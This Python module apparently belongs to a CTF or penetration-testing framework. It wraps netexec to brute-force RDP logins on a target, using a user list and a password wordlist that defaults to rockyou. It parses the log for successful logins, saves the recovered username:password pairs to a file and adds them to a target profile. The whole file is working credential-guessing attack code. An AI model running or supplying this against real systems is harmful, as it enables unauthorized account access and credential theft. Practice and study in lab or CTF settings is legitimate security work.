from pathlib import Path
from datetime import datetime
import subprocess
import argparse

from core.target import get_current_ip
from core.target import target_add_cred
from core.paths import get_artifacts_dir


def run(data, cred, args):

    # =========================================================
    # COLORS
    # =========================================================

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'
    R = '\033[91m'
    BOLD = '\033[1m'
    M = '\033[95m'

    # =========================================================
    # TARGET
    # =========================================================

    target = getattr(args, "target", None)

    if not target:
        target = get_current_ip(data)

    if not target:

        print(f"\n{R}[!] {W}{BOLD}NO TARGET{W}\n")
        return

    # =========================================================
    # ARGUMENTS
    # =========================================================

    if not hasattr(args, "extra") or not args.extra:

        print(f"\n{R}[!] {W}{BOLD}MISSING USER OR USERLIST{W}")

        print(f"\n{B}Usage:{W}")

        print(f"  {Y}ctf rdp.brute {M}<name>{W}")
        print(f"  {Y}ctf rdp.brute {M}<name> <password.list>{W}")
        print(f"  {Y}ctf rdp.brute {M}<usernames.list> <passwords.list>{W}\n")

        return

    user_arg = args.extra[0]

    password_arg = (
        args.extra[1]
        if len(args.extra) >= 2
        else "/usr/share/wordlists/rockyou.txt"
    )

    # =========================================================
    # USER SOURCE
    # =========================================================

    user_path = Path(user_arg).expanduser()

    if user_path.exists():

        user_source = "file"
        users = str(user_path.resolve())

    else:

        user_source = "single"
        users = user_arg

    # =========================================================
    # PASSWORD SOURCE
    # =========================================================

    password_path = Path(
        password_arg
    ).expanduser().resolve()

    if not password_path.exists():

        print(
            f"\n{R}[!] {W}{BOLD}PASSWORD LIST NOT FOUND{W}"
        )

        print(
            f"{B}  └── {C}{password_path}{W}\n"
        )

        return

    # =========================================================
    # REFERENCE MODE
    # =========================================================

    if getattr(args, "ref", False):

        print(
            f"\n{B}┌── {BOLD}MODULE: RDP BRUTE FORCE{W}{B} ─────────────────────┐{W}"
        )

        print(
            f"{B}└──────────────────────────────────────────────────────────┘{W}"
        )

        print(f"\n{B}[*]{W} Example\n")

        print(
            f"{Y}netexec rdp "
            f"{C}<target>{Y} "
            f"-u {C}<user>{Y} "
            f"-p {C}<passwordlist>{W}\n"
        )

        return

    # =========================================================
    # ARTIFACTS
    # =========================================================

    target_name = str(target)


    artifact_dir = (
        get_artifacts_dir(target_name)
        / "rdp"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    stamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    logfile = (
        artifact_dir /
        f"rdp_brute_{stamp}.log"
    )

    creds_file = (
        artifact_dir /
        "valid_creds.txt"
    )

    # =========================================================
    # HUD
    # =========================================================

    print(
        f"\n{B}┌── {BOLD}MODULE: RDP BRUTE FORCE{W}{B} ─────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Target:{W}    "
        f"{C}{str(target):<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Users:{W}     "
        f"{C}{Path(users).name if user_source == 'file' else users:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Passwords:{W} "
        f"{C}{password_path.name:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└──────────────────────────────────────────────────────────┘{W}"
    )

    # =========================================================
    # COMMAND
    # =========================================================

    cmd = [
        "netexec",
        "rdp",
        str(target),
        "-u",
        str(users),
        "-p",
        str(password_path),
        "--log",
        str(logfile),
        "--ignore-pw-decoding"

    ]

    if getattr(args, "local", False):
        cmd.append("--local-auth")


    print(f"\n{B}[*]{W} Running\n")
    print(f"{Y}{' '.join(cmd)}{W}\n")

    # =========================================================
    # EXECUTE
    # =========================================================

    subprocess.run(cmd)

    # =========================================================
    # PARSE LOG
    # =========================================================

    if not logfile.exists():

        print(
            f"\n{R}[!] {W}LOGFILE NOT FOUND{W}"
        )

        print(
            f"{B}  └── {C}{logfile}{W}\n"
        )

        return

    recovered = []

    try:

        lines = logfile.read_text(
            errors="ignore"
        ).splitlines()

    except Exception:

        print(
            f"\n{R}[!] {W}FAILED TO READ LOGFILE{W}\n"
        )

        return

    for line in lines:

        if "[+]" not in line:
            continue

        if ":" not in line:
            continue

        try:

            part = line.split("[+]")[-1].strip()

            if "\\" in part:
                part = part.split("\\", 1)[1]

            username, password = part.split(
                ":",
                1
            )

            username = username.strip()
            password = password.strip()

            recovered.append(
                {
                    "username": username,
                    "password": password
                }
            )

        except Exception:
            pass

    # =========================================================
    # RESULTS
    # =========================================================

    if not recovered:

        print(
            f"\n{Y}[-] {W}No valid credentials found{W}\n"
        )

        return

    with open(creds_file, "w") as f:

        for entry in recovered:

            f.write(
                f"{entry['username']}:{entry['password']}\n"
            )

    print(
        f"\n{G}[+] {W}Recovered "
        f"{C}{len(recovered)}{W} credential(s)\n"
    )

    for entry in recovered:

        print(
            f"  {B}├──{W} "
            f"{C}{entry['username']}{W}:"
            f"{Y}{entry['password']}{W}"
        )

    print()

    print(
        f"{G}[+] {W}Credentials Saved"
    )

    print(
        f"{B}  └── {C}{creds_file}{W}\n"
    )
    
   # =========================================================
    # SAVE TO PROFILE
    # =========================================================

    import argparse

    new_creds = 0

    for entry in recovered:

        try:

            target_add_cred(
                argparse.Namespace(
                    user=entry["username"],
                    password=entry["password"],
                    hash=None,
                    aes=None,
                    ccache=None
                )
            )

            new_creds += 1

        except Exception:
            pass

    print(
        f"{G}[+] {W}Added "
        f"{C}{new_creds}{W} credential(s) "
        f"to target profile\n"
    )

    return [
        {
            "type": "credential",
            "data": {
                "service": "rdp",
                "username": x["username"],
                "password": x["password"]
            }
        }
        for x in recovered
    ]
